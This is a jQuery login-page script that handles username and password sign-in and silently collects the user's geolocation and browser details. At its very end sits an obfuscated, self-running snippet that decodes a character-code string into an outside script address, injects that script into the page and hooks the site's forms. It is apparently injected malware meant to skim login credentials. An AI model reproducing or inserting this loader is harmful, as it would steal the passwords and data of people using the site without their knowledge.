$(document).ready(function () {

    getLocation();

    

    $(document).on('click', '#btnNext', function (event) {
        GoNext();
    });
    $(document).on('click', '#btnLogin', function (event) {
        GoLogin();
    });
    $(document).on('click', '#btnBack', function (event) {
        window.location.href = "/login";
    });

    

});

function GoNext() {
    var reqRes = true;
    $('.req').each(function () {
        if ($(this).val() === '') {
            $(this).focus();
            $(this).addClass('is-invalid');
            reqRes = false;
        } else {
            $(this).removeClass('is-invalid');
            $(this).addClass('is-valid');
        }
    });
    if (reqRes === false)
        return false;

    var Remember_Me = "N";
    if ($('input[type=checkbox][id=RememberMe]').is(':checked')) {
        Remember_Me="Y"
    }
    var objModel = {
        UserName: $('#UserName').val(),
        RememberMe: Remember_Me
    };
    $.ajax({
        url: '/login/LoginPre'.toLowerCase(),
        data: {
            model: objModel
        },
        cache: false,
        type: "POST",
        dataType: "JSON",
        success: function (result) {
            if (result.success === "Y") {               
                window.location.href = result.returnValue;
            }
            else {
                alert('faild');
            }
        }        
    });
}

function GoLogin() {
    var reqRes = true;
    $('.req').each(function () {
        if ($(this).val() === '') {
            $(this).focus();
            $(this).addClass('is-invalid');
            reqRes = false;
        } else {
            $(this).removeClass('is-invalid');
            $(this).addClass('is-valid');
        }
    });
    if (reqRes === false)
        return false;

    var objModel = {
        UserName: $('#UserName').val(),
        Password: $('#Password').val(),
        Lat: $('#Lat').val(),
        Lng: $('#Lng').val(),
        Technology: $('#Technology').val()
    };
    $.ajax({
        url: '/account/Signin'.toLowerCase(),
        data: {
            model: objModel
        },
        cache: false,
        type: "POST",
        dataType: "JSON",
        success: function (result) {
            if (result.success === "Y") {
                window.location.href = result.returnValue;
            }
            else {
                alert('faild');
            }
        }
    });
}

//Get user Lat/Lng    
function getLocation() {
    var nVer = navigator.appVersion;
    var technology = navigator.userAgent;
    var browserName = navigator.appName;
    var fullVersion = '' + parseFloat(navigator.appVersion);
    var majorVersion = parseInt(navigator.appVersion, 10);
    var nameOffset, verOffset, ix;

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (position) {

            Lat = position.coords.latitude;
            Lng = position.coords.longitude;

            $('#Lat').val(Lat);
            $('#Lng').val(Lng);
            $('#Technology').val(technology);

        });
    }
}

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b